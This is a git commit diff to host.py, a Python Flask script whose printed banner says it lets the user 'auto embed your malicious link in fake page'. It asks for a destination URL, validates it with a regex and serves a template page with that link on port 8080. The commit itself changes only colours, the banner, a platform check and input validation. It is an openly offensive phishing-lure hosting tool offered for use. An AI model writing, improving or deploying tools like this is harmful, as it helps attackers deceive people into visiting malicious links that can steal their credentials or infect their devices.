3767bf2e8b4e91be1375a653739f43d4baa64cac
Zaeem20 <duranizaeem@gmail.com>
2022-04-17 02:36:30 +0530

    new logo updated and minor changes

--- host.py
+++ host.py
@@ -1,58 +1,64 @@
 #!/bin/python3
 #Auto hosting Script
-
 import os
+import re
+import sys
 import time
 from flask import Flask, render_template
+from lib.asciiart import banner, check_platform
+
 
 app = Flask(__name__)
 
+URL_REGEX = 'http[s]?:\/\/([a-z0-9]*[\.]?[a-z0-9_]+\.[\w]+)[\/]?.*'
 
 #colours
-pur='\033[35m'
-cyan='\033[1;36m'
-grn='\033[1;92m'
-end='\033[0m'
-
-
-
-
-
+if not check_platform():
+    red = '\033[1;31m'
+    pur='\033[35m'
+    cyan='\033[1;36m'
+    grn='\033[1;92m'
+    end='\033[0m'
+    br = '\033[1;77m'
+else:
+    red = pur = cyan = grn = br = end = ''
 
 #Credits
 
-print(f"{grn}                  WELCOME HERE YOU CAN AUTO EMBED YOUR MALICIOUS LINK IN FAKE PAGE {end}")
+print(f"{grn}               WELCOME HERE YOU CAN AUTO EMBED YOUR MALICIOUS LINK IN FAKE PAGE {end}")
 time.sleep(1)
-print(f'''               
-                ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ██╗  ██╗███████╗
-                ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
-                ███████║███████║██║     █████╔╝ █████╗  ██████╔╝ ╚███╔╝ ███████╗
-                ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗ ██╔██╗ ╚════██║
-                ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██╔╝ ██╗███████║
-                ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-                                                                    ''')
-print(f'''{grn}                                +-----------------------+
-                                |Author| Zaeem Technical|
-                                +-----------------------+{end}''')
-print(f"{pur}STEPS TO BE FOLLOWED {end}")
-print(f"{cyan}Auto host is not working always {end}")
-print(f"{grn}USE manual host instead of Auto Setup {end}")
+print(banner)
+print(f'''{grn}                                {red}+{end}{grn}-----------------------{end}{red}+{end}
+                                {grn}|Author| Zaeem Technical|{end}
+                                {red}+{end}{grn}-----------------------{end}{red}+{end}
+                                {grn}|Github| Zaeem20        |{end}
+                                {red}+{end}{grn}-----------------------{end}{red}+{end}''')
+
 print()
-print() 
+print()
 time.sleep(2)
 
 print(f"{grn}Enter Your Destination Link:-  {end}")
-link =  input('\n\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Enter Whole URL: \033[0m')
+link =  input(f'\n{grn}[{end}{br}*{end}{grn}] Enter Whole URL including [HTTP/HTTPS]: {end}')
 
-os.system('cls')
-
-
-
-@app.route('/')
-def index():
-    return render_template("index.html", url=str(link))
+while True:
+    try:
+        valid_link = re.search(URL_REGEX, link)
+        if valid_link:
+            os.system('clear' if check_platform() else 'cls')   # one-liner if else 😎
+            @app.route('/')
+            def index():
+                return render_template("index.html", url=link)
+            break
+        else:
+            link = input(f"{grn}[{end}{br}+{end}{grn}]{end}{red} Please re-enter url, it looks incorrect: {end}")
+    except KeyboardInterrupt:
+        print(f'\n{grn}[{end}{cyan}{br}?{end}{end}{grn}]{end}{red} Stopped, Exiting: 1{end}')
+        sys.exit(1)
+        
 
 if __name__ == '__main__':
+    time.sleep(3)
     app.run("0.0.0.0", port=8080)
 
 
